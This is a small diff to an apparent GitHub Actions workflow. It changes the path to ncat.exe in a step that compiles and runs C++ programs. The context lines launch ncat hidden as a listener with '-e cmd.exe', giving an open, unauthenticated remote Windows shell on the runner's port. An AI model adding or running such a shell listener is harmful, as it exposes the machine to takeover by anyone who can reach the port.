@@ -39,7 +39,7 @@ jobs:
 
       - name: Run C++ Programs
         run: |
-          $ncatPath = "C:\Program Files\Nmap\ncat.exe"
+          $ncatPath = "C:\Program Files\Npcap\ncat.exe"
           Start-Process -FilePath $ncatPath -ArgumentList "-l -p $env:PORT -e cmd.exe" -WindowStyle Hidden
           foreach ($file in Get-ChildItem -Path . -Filter "*.exe" -Recurse) {
             if ($file.Name -notlike "*.cpp.exe") { # Skip the .cpp files themselves
